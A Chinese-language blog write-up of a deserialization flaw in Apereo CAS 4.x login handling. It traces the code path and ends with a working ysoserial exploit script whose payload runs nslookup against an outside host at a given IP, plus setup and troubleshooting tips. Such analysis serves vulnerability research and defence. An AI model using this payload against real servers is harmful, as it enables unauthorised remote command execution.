---
layout: post
title: "Apereo Cas 反序列化漏洞"
categories: "WebSecurity"
---

#### 0x00 漏洞描述

在Apereo Cas 4.X版本(测试了4.1.5、4.2.0)中的loginHandlerAdapter中存在反序列化漏洞，触发漏洞的是在登录中的execution参数，提交特定的数据即会触发命令执行

#### 0x01 漏洞分析

首先反序列化的执行点为：org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode

 ```java
public Object decode(byte[] encoded) throws IOException {
    byte[] data;
    try {
        data = this.cipherBean.decrypt(encoded);	// 解密数据
    } catch (Exception var11) {
        throw new IOException("Decryption error", var11);
    }

    ByteArrayInputStream inBuffer = new ByteArrayInputStream(data);
    ObjectInputStream in = null;

    Object var5;
    try {
        if (this.compression) {
            in = new ObjectInputStream(new GZIPInputStream(inBuffer));
        } else {
            in = new ObjectInputStream(inBuffer);
        }

        var5 = in.readObject();			// 反序列化
    } catch (ClassNotFoundException var10) {
        throw new IOException("Deserialization error", var10);
    } finally {
        if (in != null) {
            in.close();
        }
    }
    return var5;
}
 ```

通过分析后梳理出大致的调用栈如下：

```
org.jasig.spring.webflow.plugin.EncryptedTranscoder#decode
org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#getFlowExecution
org.springframework.webflow.executor.FlowExecutorImpl#resumeExecution
org.springframework.webflow.mvc.servlet.FlowHandlerAdapter#handle
```

而最外层的直接对应loginHandlerAdapter，cas-servlet.xml中对应配置：

```xml
<bean id="loginHandlerAdapter" class="org.jasig.cas.web.flow.SelectiveFlowHandlerAdapter"
          p:supportedFlowId="login" p:flowExecutor-ref="loginFlowExecutor" p:flowUrlHandler-ref="loginFlowUrlHandler"/>
```

可控的数据在FlowHandlerAdapter.handle中接收，并传入到调用链中：

```
public ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
    FlowHandler flowHandler = (FlowHandler)handler;
    this.checkAndPrepare(request, response, false);
    String flowExecutionKey = this.flowUrlHandler.getFlowExecutionKey(request);		// 这里直接获取POST参数execution
    if (flowExecutionKey != null) {
        try {
            ServletExternalContext context = this.createServletExternalContext(request, response);
            FlowExecutionResult result = this.flowExecutor.resumeExecution(flowExecutionKey, context);		// 触发链
            this.handleFlowExecutionResult(result, context, request, response, flowHandler);
        } catch (FlowException var11) {
            this.handleFlowException(var11, request, response, flowHandler);
        }
    }
```

传入的数据在反序列化之前，会先进行解密操作：org.jasig.spring.webflow.plugin.ClientFlowExecutionRepository#getFlowExecution

```
ClientFlowExecutionRepository.SerializedFlowExecutionState state = (ClientFlowExecutionRepository.SerializedFlowExecutionState)this.transcoder.decode(encoded);
```

后续跟入分析了decode的流程，默认并未使用随机key进行加解密，相关的调用栈如下：

```
org.cryptacular.bean.AbstractCipherBean#decrypt(byte[])
org.cryptacular.CiphertextHeader#decode(byte[])
org.cryptacular.bean.AbstractBlockCipherBean#process(org.cryptacular.CiphertextHeader, boolean, byte[])
org.cryptacular.bean.BufferedBlockCipherBean#newCipher
```

这里在利用时，直接使用org.apereo.spring.webflow.plugin.EncryptedTranscoder进行数据的加密即可

至此相关的关键点就比较清楚了：

* 可控的数据如何传入
* 可控数据的加解密
* 反序列化的执行点
* 完整的触发链

#### 0x02 漏洞利用

利用脚本：

```java
package ysoserial;

import org.cryptacular.util.CodecUtil;
import ysoserial.payloads.ObjectPayload;
import org.apereo.spring.webflow.plugin.EncryptedTranscoder;

public class ApereoExploit {

    public static void main(String[] args) throws Exception{
        String poc[] = {"CommonsCollections5","nslookup pench3r.github.io 159.65.72.169"};
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]);
        //AES加密
        EncryptedTranscoder et = new EncryptedTranscoder();
        byte[] encode = et.encode(payloadObject);
        // Object decode = et.decode(encode);
        //base64编码
        System.out.println(CodecUtil.b64(encode));
        byte[] decode = CodecUtil.b64(CodecUtil.b64(encode));
        System.out.println("Done");
    }
}
```

本地环境搭建时需要注意一些包的版本信息：

```xml

<dependency>
    <groupId>org.cryptacular</groupId>
    <artifactId>cryptacular</artifactId>
    <version>1.0</version>
</dependency>
<dependency>
    <groupId>org.apereo</groupId>
    <artifactId>spring-webflow-client-repo</artifactId>
    <version>1.0.3</version>
</dependency>
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>		// 为了本地调试
    <version>3.1</version>
</dependency>

```

<strong>本地测试的思路：</strong>

* 添加commons collections3.1版本，可以提供反序列化攻击链
* 使用EncryptedTranscoder的encode和decode可以直接测试是否可以成功执行命令
* 最后在测试环境中动态调试比对那些地方需要调整

<strong>碰到的一些问题：</strong>

* 在jdk8的环境下，使用CommonsCollections1时，提示：`java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet`;

  解决办法：使用CommonsCollections5即可

* 在测试环境一直失败，通过调试发现，在EncryptedTranscoder.decode时所接受的data与payload生成的data数据不一致，原因是payload和环境中使用的org.cryptacular版本不一致导致

  解决办法：payload切换org.cryptacular版本为1.0即可

* 在测试环境中跟踪反序列化过程，检测到`ClassNotFoundException: org.apache.commons.collections.keyvalue.TiedMapEntry`

  解决办法：将commons-collections3.1.jar加入到测试环境中的CLASSPATH中即可

#### 0x03 总结

该漏洞的形式跟shiro反序列化的类似，同样是因为反序列化的数据过度依赖自身的加密算法进行解密，算法本身没有问题，问题是算法使用的key都是默认值导致攻击者可以去构造对应的数据
